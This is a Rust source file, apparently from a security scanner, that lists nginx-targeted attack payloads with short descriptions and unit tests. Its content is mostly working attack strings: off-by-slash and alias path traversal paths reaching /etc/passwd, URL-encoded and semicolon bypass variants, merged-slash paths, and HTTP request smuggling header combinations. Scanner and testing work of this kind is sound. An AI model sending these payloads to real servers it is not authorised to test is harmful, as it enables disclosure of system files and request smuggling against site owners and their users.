use super::TargetPayload;

pub fn get_payloads() -> Vec<TargetPayload> {
    let mut payloads = Vec::new();

    payloads.extend(get_off_by_slash_payloads());
    payloads.extend(get_alias_traversal_payloads());
    payloads.extend(get_merge_slashes_payloads());
    payloads.extend(get_chunked_encoding_payloads());

    payloads
}

fn get_off_by_slash_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "/../".to_string(),
            description: "Off-by-slash: missing slash after location prefix".to_string(),
            category: "off-by-slash".to_string(),
        },
        TargetPayload {
            payload: "/..../".to_string(),
            description: "Off-by-slash variant with extra dots".to_string(),
            category: "off-by-slash".to_string(),
        },
        TargetPayload {
            payload: "/static../".to_string(),
            description: "Off-by-slash with static prefix".to_string(),
            category: "off-by-slash".to_string(),
        },
        TargetPayload {
            payload: "/static..".to_string(),
            description: "Trailing double dots".to_string(),
            category: "off-by-slash".to_string(),
        },
        TargetPayload {
            payload: "/static../etc/passwd".to_string(),
            description: "Off-by-slash to passwd".to_string(),
            category: "off-by-slash".to_string(),
        },
        TargetPayload {
            payload: "/static..%2f..%2f..%2fetc/passwd".to_string(),
            description: "Off-by-slash encoded traversal".to_string(),
            category: "off-by-slash".to_string(),
        },
    ]
}

fn get_alias_traversal_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "/images../".to_string(),
            description: "Alias path traversal".to_string(),
            category: "alias-traversal".to_string(),
        },
        TargetPayload {
            payload: "/img../etc/passwd".to_string(),
            description: "Alias traversal to passwd".to_string(),
            category: "alias-traversal".to_string(),
        },
        TargetPayload {
            payload: "/files..%2f..%2f..%2fetc/passwd".to_string(),
            description: "Encoded alias traversal".to_string(),
            category: "alias-traversal".to_string(),
        },
        TargetPayload {
            payload: "/static/..;/".to_string(),
            description: "Semicolon bypass".to_string(),
            category: "alias-traversal".to_string(),
        },
        TargetPayload {
            payload: "/static/%2e%2e/".to_string(),
            description: "URL encoded dots".to_string(),
            category: "alias-traversal".to_string(),
        },
    ]
}

fn get_merge_slashes_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "//etc/passwd".to_string(),
            description: "Double slash to passwd".to_string(),
            category: "merge-slashes".to_string(),
        },
        TargetPayload {
            payload: "///etc/passwd".to_string(),
            description: "Triple slash".to_string(),
            category: "merge-slashes".to_string(),
        },
        TargetPayload {
            payload: "////etc/passwd".to_string(),
            description: "Quad slash".to_string(),
            category: "merge-slashes".to_string(),
        },
        TargetPayload {
            payload: "/static//../etc/passwd".to_string(),
            description: "Double slash in path".to_string(),
            category: "merge-slashes".to_string(),
        },
    ]
}

fn get_chunked_encoding_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "Transfer-Encoding: chunked\r\nTransfer-Encoding: x".to_string(),
            description: "Double TE header smuggling".to_string(),
            category: "http-smuggling".to_string(),
        },
        TargetPayload {
            payload: "Transfer-Encoding: chunked\r\nContent-Length: 0".to_string(),
            description: "TE.CL smuggling test".to_string(),
            category: "http-smuggling".to_string(),
        },
        TargetPayload {
            payload: "Transfer-Encoding: xchunked".to_string(),
            description: "Invalid TE prefix".to_string(),
            category: "http-smuggling".to_string(),
        },
        TargetPayload {
            payload: "Transfer-Encoding: x".to_string(),
            description: "Invalid TE value".to_string(),
            category: "http-smuggling".to_string(),
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_nginx_payloads_non_empty() {
        let payloads = get_payloads();
        assert!(payloads.len() >= 15, "nginx should have at least 15 payloads, got {}", payloads.len());
    }

    #[test]
    fn test_nginx_categories() {
        let payloads = get_payloads();
        let categories: Vec<&str> = payloads.iter().map(|p| p.category.as_str()).collect();
        assert!(categories.contains(&"off-by-slash"));
        assert!(categories.contains(&"alias-traversal"));
        assert!(categories.contains(&"merge-slashes"));
        assert!(categories.contains(&"http-smuggling"));
    }

    #[test]
    fn test_nginx_off_by_slash_count() {
        let payloads = get_off_by_slash_payloads();
        assert_eq!(payloads.len(), 6);
    }

    #[test]
    fn test_nginx_alias_traversal_count() {
        let payloads = get_alias_traversal_payloads();
        assert_eq!(payloads.len(), 5);
    }

    #[test]
    fn test_nginx_merge_slashes_count() {
        let payloads = get_merge_slashes_payloads();
        assert_eq!(payloads.len(), 4);
    }

    #[test]
    fn test_nginx_chunked_encoding_count() {
        let payloads = get_chunked_encoding_payloads();
        assert_eq!(payloads.len(), 4);
    }

    #[test]
    fn test_nginx_all_payloads_have_required_fields() {
        for p in get_payloads() {
            assert!(!p.payload.is_empty());
            assert!(!p.description.is_empty());
            assert!(!p.category.is_empty());
        }
    }
}
